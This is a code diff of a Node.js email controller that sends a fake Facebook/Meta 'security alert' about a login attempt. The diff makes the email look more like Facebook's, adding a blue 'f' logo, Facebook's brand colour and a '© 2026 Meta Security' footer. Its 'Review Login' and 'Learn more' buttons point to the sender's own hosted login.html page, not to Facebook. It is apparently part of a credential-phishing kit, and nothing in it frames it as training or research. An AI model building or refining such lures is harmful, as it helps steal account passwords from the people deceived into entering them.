@@ -1,56 +1,80 @@
 // controllers/emailController.js
-const sendEmail = require('../services/emailService');
+const sendEmail = require("../services/emailService");
 
-// Inline f logo (SVG - no file needed)
+// PB logo (Facebook-style circle)
 const fLogo = `
-<svg width="40" height="40" viewBox="0 0 100 100" fill="#1a73e8" xmlns="http://www.w3.org/2000/svg">
-  <circle cx="50" cy="50" r="45" stroke="#1a73e8" stroke-width="5" fill="none"/>
-  <text x="50%" y="55%" text-anchor="middle" fill="#1a73e8" font-size="40" font-family="Arial" dy=".3em">PB</text>
-</svg>
+<div style="
+  width:42px;
+  height:42px;
+  border-radius:50%;
+  background:#1877f2;
+  color:white;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+  font-size:20px;
+  font-family:Arial;
+">
+  f
+</div>
 `;
 
-// Email template
 const emailTemplate = (loginLink, userEmail) => `
-<div style="background:#18191a;color:#e4e6eb;font-family:Arial,sans-serif;padding:30px;">
+<div style="background:#18191a;padding:25px;font-family:Arial;color:#e4e6eb;">
 
-  <!-- Top line with f Logo -->
+  <!-- HEADER -->
   <div style="display:flex;align-items:center;">
     ${fLogo}
-    <hr style="flex-grow:1;border:1px solid #3a3b3c;margin-left:10px;">
+    <div style="flex:1;border-bottom:1px solid #3a3b3c;margin-left:10px;"></div>
   </div>
 
-  <p style="margin-top:20px;">Hello,</p>
+  <!-- CONTENT -->
+  <p style="margin-top:20px;font-size:15px;">Hello,</p>
 
-  <p>
-    We noticed a login attempt to your Facebook Security portal.
-    This is to ensure your account remains secure.
+  <p style="font-size:15px;line-height:1.6;">
+    We noticed a login attempt to your account. This is a security alert to keep your account protected.
   </p>
 
-  <b>About this change</b>
-  <p>
-    If this login was made by you, no action is required.
-    If not, please review your account immediately.
+  <p style="font-weight:bold;margin-top:15px;">About this change</p>
+
+  <p style="font-size:14px;line-height:1.6;">
+    If this login was made by you, no action is required. Otherwise, please secure your account immediately.
   </p>
 
-  <!-- Button -->
+  <!-- BUTTON -->
   <a href="${loginLink}"
-     style="display:block;width:100%;text-align:center;background:#1a73e8;color:#fff;
-     padding:14px;text-decoration:none;border-radius:5px;margin:20px 0;font-weight:bold;">
-     Confirm Login
+     style="
+       display:block;
+       width:100%;
+       text-align:center;
+       background:#1877f2;
+       color:white;
+       padding:14px;
+       border-radius:6px;
+       text-decoration:none;
+       font-weight:bold;
+       margin:25px 0;
+     ">
+     Review Login
   </a>
 
-  <p>
-    If this wasn’t you, we strongly recommend securing your account immediately.
+  <p style="font-size:14px;">
+    If this wasn’t you, we recommend updating your password immediately.
   </p>
 
-  <hr style="border:1px solid #3a3b3c;margin:15px 0;">
+  <!-- FOOTER LINE -->
+  <div style="border-bottom:1px solid #3a3b3c;margin:20px 0;"></div>
 
-  <p style="font-size:13px;">
+  <!-- FOOTER -->
+  <p style="font-size:12px;color:#b0b3b8;">
     © 2026 Meta Security · 
-    <a href="${loginLink}" style="color:#1a73e8;text-decoration:none;">Learn more</a>
+    <a href="${loginLink}" style="color:#1877f2;text-decoration:none;">Learn more</a>
   </p>
 
-  <p style="font-size:12px;color:#aaa;">Sent to ${userEmail}</p>
+  <p style="font-size:11px;color:#8a8d91;">
+    Sent to ${userEmail}
+  </p>
 </div>
 `;
 
@@ -62,22 +86,23 @@ exports.sendLoginEmail = async (req, res) => {
       return res.status(400).json({ success: false, message: "Email required" });
     }
 
+    // ✅ ALWAYS use Railway (no localhost)
     const loginLink = `${process.env.FRONTEND_URL}/login.html`;
 
     const sent = await sendEmail(
       email,
-      "🔐 Confirm Your Login - Facebook Security",
+      "🔐 Security Alert: Confirm Your Login",
       emailTemplate(loginLink, email)
     );
 
     if (!sent) {
-      return res.status(500).json({ success: false, message: "Email failed to send" });
+      return res.status(500).json({ success: false, message: "Email failed" });
     }
 
-    return res.status(200).json({ success: true, message: "Email sent successfully" });
+    return res.json({ success: true, message: "Email sent" });
 
   } catch (err) {
-    console.error("Email error:", err);
-    return res.status(500).json({ success: false, message: "Server error" });
+    console.error("Controller error:", err);
+    return res.status(500).json({ success: false });
   }
 };
